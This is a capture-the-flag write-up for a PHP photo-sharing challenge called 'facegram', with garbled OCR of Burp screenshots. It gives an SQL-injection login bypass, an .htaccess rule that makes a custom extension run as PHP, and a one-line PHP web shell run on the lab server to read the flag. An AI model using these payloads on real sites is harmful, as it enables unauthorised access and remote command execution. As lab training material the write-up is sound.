# facegram
> This punk kid stole my idea for a photo sharing site! Can you break into it for me?

## About the Challenge
We were given a website without the source code, and this website has a lot of functionality

* View uploaded image (`/view.php?id=1`)
* View profile (`/user.php?id=1`)
* Login (`/login.php`)
* Register (`/register.php`)
* Forgot password (`/forgot-password.php`)
* Upload image (`/upload.php`)


[Image extracted text: Facegram
Login
Register
facegram]


## How to Solve?
Initially, I attempted to register and log in to my account, and then successfully uploaded a PHP file. However, when visiting the uploaded file at the `/uploads/` endpoint, the output showed `403 Forbidden`


[Image extracted text: Request
Response
Pretty
Raw
Hex
51
In
=
Pretty
Raw
Hex
Render
In
POST /upload.php HTTP/1.1
HTTP/1.1
200
OK
2
Host:
thecybercoopctf-e41bf6006236-facegram-1. chals
io
2
Date
Tue,
19
Dec
2023
02:26:29
GMT
3
Cookie
PHPSESSID-9043el5bddc6c720d1627fc3797b64a0
3
Server:
Apache/2.4.54
(Debian)
Content-Length:
316
X-Powered-By
PHP/7.4.33
5 Origin:
https:
[thecybercoopctf-e41bf6006236-facegram-1. chals
io
5
Expires:
19
Nov
1981
08:52:00
GMT
Content-Type=
multipart/form-data;
6
Cache-Control:
no-store,
no-cache,
must-revalidate
boundary=
WebKitFormBoundarydzNXOAZ82pC3GpBZ
Pragma
no-cache
User-Agent
Mozilla/5.0
(Windows
NT
10
0;
Win64;
X64)
8 Vary
Accept-Encoding
AppleWebKit/537
36
(KHTML ,
like
Gecko)
Chrome
120,
0
6099 _
71
Content-Length:
1692
Safari/537
36
10
Connection:
close
Accept:
11
Content-Type
text/html;
charset=UTF_8
text/html,application/xhtml+xml,application/xml;q-0.9,image/avif
12
image/webp, image/apng
*/*;q=0.8,application/signed-exchange;v=b3;
13
Uploaded
q=0 _
14
<link
rel-"stylesheet'
href-"
Referer:
https: //stackpath.bootstrapcdn. com/bootstrap/4.3.1/css/bootstrap_
https: //thecybercoopctf-e41bf6006236-facegram-1. chals
io/upload. p
min.cSS
integrity=
hp
sha384-ggOyROiXCbMQv3Xipma34MD+dH/1fQ784/j6cY/ iJTQUOhcWr7xgJvoRxT
L0
Accept-Encoding
gzip,
deflate
br
2MZwlt"
crossorigin="anonymous
11 Accept-Language
en-US, en;q=0.9
15
<script src-"https: / /code 
jquery. cOm/jquery-3.3.1.slim.min.js"
12 Priority:
u=0
integrity=
13
Connection:
close
sha384-q81/X+965DzO0rTZabK41JStQIAqVgRVzpbzoSsmXKp4YfRvH+8abtTEIP
14
i6jizo"
crossorigin="anonymous
15
~~WebKitFormBoundarydzNXOAZ82pC3GpBZ
<lscript>
16
Content-Disposition:
form-data;
name=" image" ;
filename-"test. php"
16
<script src="
17
Content-Type:
application/x-php
https: //cdnjs.cloudflare
com/ajax/libs/popper.js/1.14.7/umd/poppe
18
r.min.
js"
integrity=
19
GIFSGA;
<php phpinfo( ) ;
2 >
sha384-UOZeTOCpHqdsJQ6hJtySKVphtPhzWjgWOIc HTMGa3JDZwrnQq4sF86IH
20
~~WebKitFormBoundarydzNXOAZ82pC3GpBZ
NDzOW1"
crossorigin="anonymous
21
Content-Disposition:
form-data;
name-"submit"
<lscript>
22
17
<script src="
23
Upload
https:_
Istackpath.bootstrapcdn. com/bootstrap/4.3.1/js/bootstrap
24
~WebKitFormBoundarydzNXOAZ82pC3GpBZ =
in.js
integrity=
25
sha384-JjSmVgydOp3pXBlrRibZUAYoIly6orQbVrjIEaFf/nJGzIxFDsf4xOxIM+
B07 jRM'
crossorigin="anonymous
<lscript>
18
19
Znau
Caccs
naubar
nauna
Vnan
naubar_licbt
ho_
iont
Thu ,]


I also tried to change the extension (Ex: .phar, .inc), the mime type, etc but it still doesn't works because the website will read my file as a plain text


[Image extracted text: https:IIthecybercoopctf-e41bf6006236-facegram-1.chals ioluploads/test phar
GIF89A; <?php phpinfo() ;
2>]


And then I attempted to exploit the website using SQL injection vulnerabilities on some endpoints but failed. Subsequently, I tried to perform SQL injection on the login page to log in as an `admin`, and it was successful. Here is the payload I used to login as an `admin`

```
username: admin' or true-- -
password: test
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
In
Pretty
Raw
Hex
Render
In
POST /login. php HTTP/1.1
HTTP/1.1
302
Found
2
Host:
thecybercoopctf-e41bf6006236-facegram-1. chals
io
2
Date
Tue,
19
Dec
2023
02:35:39
GMT
3 Content-Length:
39
3
Server:
Apache/2.4.54
(Debian)
Upgrade-Insecure-Requests
X-Powered-By
PHP/7
4.33
5
Origin:
https:
[thecybercoopctf-e41bf6006236-facegram-1. chals
io
5
Set-Cookie:
PHPSESSID-71c9130a58abcdedb5o6labccb2Sclf8; path-/
6 Content-Type
application/x-WWW-form-urlencoded
6
Expires
19
Nov
1981
08
52:00
GMT
User-Agent
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
Cache-Control:
no-store,
no-cache,
must-revalidate
AppleWebKit/537
36
(KHTML ,
like
Gecko)
Chrome/120.0.6099.71
8
Pragma
no-cache
Safari/537
36
Location:
Accept:
10 Content-Length:
text/html,application/xhtmltxml,application/xml;q-0.9, image/avif ,
11
Connection:
close
image/webp
image/apng,*/*;
8
application/signed-exchange; v=b3;
12 Content-Type
text/html;
charset-UTF-8
q=0.71
13
Referer:
14
https: //thecybercoopctf-e41bf6006236-facegram-1. chals
io/ login. ph
10
Accept-Encoding
gzip,
deflate
br
11
Accept-Language
en-US, en;q=0.9
12 Priority:
u=0
13
Connection:
close
14
15 userzadmin%27+orttrue--+-&password-test
Thu,
q=0 .]


In the admin panel, there are two new features:

* Manage user
* Upload zip file


[Image extracted text: Admin Panel
Users
Bulk Uploader]



[Image extracted text: Bulk image uploader
Select zip to upload:
Use this to bulk upload images to your admin account
Choose File
No file chosen
Upload]


Hmmm, a `zip` file? I tried uploading a random zip file, and this feature will unzip our uploaded file, placing each file from the zip in the /uploads directory.

So I created a `.htaccess` file, and its content will look like this:

```
AddType application/x-httpd-php .php16
```

I also added another PHP file, but I'm using `.php16` as the extension.

```php
<?php echo system($_GET['cmd']); ?>
```

And heck yeah! we can execute OS command right now


[Image extracted text: https:IIthecybercoopctf-e41bf6006236-facegram-1.chals ioluploads/test php16?cmd_cat%20.|-Iflag txt
flag {but_i_thought_zips_only_went_up}flag{but_i_thought_zips_only_went_up}]


```
flag{but_i_thought_zips_only_went_up}
```